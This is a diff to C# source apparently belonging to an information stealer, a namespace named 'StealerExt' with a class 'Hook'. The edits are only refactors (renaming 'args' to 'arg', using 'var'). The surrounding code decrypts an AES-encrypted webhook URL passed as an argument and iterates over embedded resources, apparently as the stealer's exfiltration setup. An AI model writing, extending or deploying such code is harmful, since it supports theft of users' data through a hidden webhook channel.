@@ -12,17 +12,17 @@ namespace StealerExt
     internal static class Hook
     {
         [STAThread]
-        public static void Main(string[] args)
+        public static void Main(string[] arg)
         {
-            if (args.Length <= 0) throw new ArgumentNullException(nameof(args));
+            if (arg.Length <= 0) throw new ArgumentNullException(nameof(arg));
             try
             {
-                var PaddedDecryptedUrl = Decrypt(args[0]);
+                var PaddedDecryptedUrl = Decrypt(arg[0]);
                 _DecryptedHook = new Uri(PaddedDecryptedUrl).AbsoluteUri;
             }
             catch
             {
-                _DecryptedHook = args[0];
+                _DecryptedHook = arg[0];
             }
             string[] resName = Assembly.GetExecutingAssembly().GetManifestResourceNames();
             for (int i = 0; i < resName.Length; i++)
@@ -90,8 +90,7 @@ namespace StealerExt
                     Mode = CipherMode.CBC,
                     Padding = PaddingMode.PKCS7
                 };
-                ICryptoTransform crypto;
-                crypto = aes.CreateDecryptor();
+                var crypto = aes.CreateDecryptor();
                 return Encoding.ASCII.GetString(crypto.TransformFinalBlock(EncryptedWebhook, 0, EncryptedWebhook.Length));
             }
             catch
